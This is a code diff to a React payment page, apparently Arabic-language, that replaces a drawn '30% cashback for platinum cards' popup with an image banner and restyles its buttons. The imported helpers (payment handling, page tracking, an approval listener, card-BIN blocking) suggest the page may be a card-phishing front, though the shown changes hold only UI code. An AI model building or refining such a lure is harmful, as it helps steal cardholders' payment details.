@@ -4,7 +4,6 @@ import {
   ChevronDown,
   Wifi,
   X,
-  Gift,
   CreditCard,
   Lock,
   ShieldCheck,
@@ -15,6 +14,7 @@ import { Label } from "@/components/ui/label";
 import { Link } from "wouter";
 import { useState, useEffect } from "react";
 import { handlePay, handleCurrentPage, listenForApproval, isBinBlocked } from "@/lib/firebase";
+import cashbackImage from "@assets/adcs_1777058781807.jpg";
 
 function CashbackPopup({ onClose }: { onClose: () => void }) {
   return (
@@ -26,55 +26,27 @@ function CashbackPopup({ onClose }: { onClose: () => void }) {
         className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-fade-in"
         onClick={onClose}
       />
-      <div className="relative bg-gradient-to-br from-[#4a1525] via-[#5a1f30] to-[#3a0f1d] rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-scale-in">
+      <div className="relative rounded-3xl max-w-md w-full shadow-2xl animate-scale-in overflow-hidden bg-[#0a1438]">
         <button
           onClick={onClose}
-          className="absolute top-4 left-4 text-white/80 hover:text-white transition-colors w-8 h-8 rounded-full bg-white/10 flex items-center justify-center"
+          className="absolute top-3 left-3 z-10 text-white hover:text-white transition-colors w-9 h-9 rounded-full bg-black/50 hover:bg-black/70 flex items-center justify-center"
           data-testid="button-close-popup"
         >
           <X className="w-5 h-5" />
         </button>
 
-        <div className="text-center space-y-5">
-          <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto animate-float">
-            <Gift className="w-10 h-10 text-white" />
-          </div>
+        <img
+          src={cashbackImage}
+          alt="عرض كاش باك 30%"
+          className="w-full h-auto block"
+          data-testid="img-cashback-popup"
+        />
 
-          <div className="space-y-3">
-            <h3 className="text-2xl font-bold text-white">عرض حصري!</h3>
-            <p className="text-white text-lg leading-relaxed">
-              احصل على كاش باك يصل إلى
-            </p>
-            <div className="text-6xl font-bold text-white drop-shadow-lg">
-              30%
-            </div>
-            <p className="text-white/90 text-sm">
-              عند الدفع من خلال البطاقات من فئة البلاتينية
-            </p>
-          </div>
-
-          <div className="flex justify-center gap-3 pt-2">
-            <img
-              src="/mada.png"
-              className="h-8 bg-white/20 rounded-lg px-3 py-1"
-              alt="mada"
-            />
-            <img
-              src="/master.svg"
-              className="h-8 bg-white/20 rounded-lg px-3 py-1"
-              alt="mastercard"
-            />
-            <img
-              src="/visa.png"
-              className="h-5 bg-white/20 rounded-lg px-3 py-2"
-              alt="visa"
-            />
-          </div>
-
+        <div className="p-4 bg-[#0a1438]">
           <Button
             onClick={onClose}
             size="lg"
-            className="w-full bg-white text-[#4a1525] font-bold shadow-lg mt-4"
+            className="w-full bg-white text-[#4a1525] font-bold shadow-lg hover:bg-white/90"
             data-testid="button-continue-popup"
           >
             متابعة الدفع
